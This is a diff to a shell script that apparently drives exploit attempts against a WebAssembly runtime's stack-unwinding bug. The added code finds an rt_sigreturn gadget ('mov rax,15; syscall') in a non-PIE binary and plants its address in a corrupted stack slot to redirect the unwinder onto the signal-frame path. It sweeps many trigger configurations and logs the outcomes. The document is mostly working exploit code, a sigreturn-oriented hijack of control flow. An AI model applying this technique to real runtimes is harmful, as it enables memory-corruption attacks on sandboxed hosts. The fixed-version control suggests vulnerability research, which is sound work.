@@ -310,6 +310,50 @@ if [ -n "$PY" ]; then
   done
   echo "  staged=24 twins done" | tee -a "$OUT/sweep.log"
 
+
+  echo "--- SIGRETURN-PATTERN probe (consumed slot -> rt_sigreturn trampoline bytes; signal-frame path) ---"
+  echo "    The unwinder's frame-walk check tests [value] for 'mov rax,15; syscall'. Pointing the" >&2
+  echo "    consumed slot at a FIXED address holding that pattern (non-PIE .text) flips the walk" >&2
+  echo "    onto the signal-frame path (register context restored from the corrupted stack)." >&2
+  PAT_ADDR=$(python3 - <<'PYEOF'
+import struct
+try:
+    data = open("harness/harness", "rb").read()
+except Exception:
+    print(""); raise SystemExit
+pat = bytes.fromhex("48c7c00f0000000f05")
+i = data.find(pat)
+if i < 0:
+    print(""); raise SystemExit
+phoff = struct.unpack_from("<Q", data, 0x20)[0]
+phentsize = struct.unpack_from("<H", data, 0x36)[0]
+phnum = struct.unpack_from("<H", data, 0x38)[0]
+for j in range(phnum):
+    p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack_from("<IIQQQQQQ", data, phoff + j * phentsize)
+    if p_type == 1 and p_offset <= i < p_offset + p_filesz:
+        print(hex(p_vaddr + (i - p_offset)))
+        break
+else:
+    print("")
+PYEOF
+)
+  echo "  rt_sigreturn pattern @ ${PAT_ADDR:-none}" | tee -a "$OUT/sweep.log"
+  if [ -n "$PAT_ADDR" ]; then
+    PATV="${PAT_ADDR},${PAT_ADDR},${PAT_ADDR},${PAT_ADDR},${PAT_ADDR},${PAT_ADDR},0x414100000006,0x414100000007,0x414100000008,0x414100000009,0x41410000000a,0x41410000000b,0x41410000000c,0x41410000000d,0x41410000000e,0x41410000000f"
+    for CFG in "0 0 273" "0 0 274" "0 0 275" "0 1 274" "2 1 273" "1 0 272" "2 0 272" "2 2 275" "0 2 274" "3 3 273"; do
+      set -- $CFG; F=$1; DUM2=$2; R=$3
+      for A in $(seq 1 10); do
+        D11="$NESTED/pat_f${F}_d${DUM2}_r${R}_a${A}"
+        python3 "$NESTED/gen_nested_contracts.py" "$D11" --offset $((512-R)) --iters $((65536+R+1)) --dummy "$DUM2" --frame32 "$F" --plant-values "$PATV" > /dev/null 2>&1 || continue
+        for w in holder trigger benign; do
+          "$PY" -c "import wasmtime; open('$D11/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D11/$w.wat').read()))" 2>/dev/null
+        done
+        timeout 120 ./harness/harness -wasm "$D11/holder.wasm" -trigger "$D11/trigger.wasm" -benign "$D11/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-pat-f${F}-d${DUM2}-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-pat-f${F}-d${DUM2}-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-pat-f${F}-d${DUM2}-r${R}-a${A}.stderr" || true
+      done
+      echo "  pat f$F/d$DUM2/r$R done" | tee -a "$OUT/sweep.log"
+    done
+  fi
+
   echo "--- fixed control (wasmvm 3.0.8, r=256) ---"
   D="$NESTED/build_r256"
   if timeout 120 ./harness-fixed/harness-fixed -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 4 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-fixed-r256.json" > "ci-out/harness/nested-fixed-r256.stdout" 2> "ci-out/harness/nested-fixed-r256.stderr"; then
@@ -327,7 +371,10 @@ gadget_consumed = []
 
 def classify(f, dummy):
     base = f.split("/")[-1]
-    if base.startswith("nested-vuln-mk24-"):
+    if base.startswith("nested-vuln-pat-"):
+        mm = re.search(r'pat-f(\d+)-d(\d+)-r(\d+)-a(\d+)', f)
+        tag = f"pat/f{mm.group(1)}/d{mm.group(2)}/r{mm.group(3)}/a{mm.group(4)}" if mm else f"pat/{base}"
+    elif base.startswith("nested-vuln-mk24-"):
         mm = re.search(r'mk24-f(\d+)-d(\d+)-r(\d+)-a(\d+)', f)
         tag = f"mk24/f{mm.group(1)}/d{mm.group(2)}/r{mm.group(3)}/a{mm.group(4)}" if mm else f"mk24/{base}"
     elif base.startswith("nested-vuln-dfp24-"):
@@ -419,6 +466,8 @@ for f in sorted(glob.glob("ci-out/harness/nested-vuln-can-*.stderr")):
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-mk-*.stderr")):
     classify(f, None)
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-dfp-*.stderr")):
+    classify(f, None)
+for f in sorted(glob.glob("ci-out/harness/nested-vuln-p*at-*.stderr")):
     classify(f, None)
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-mk24-*.stderr")):
     classify(f, None)
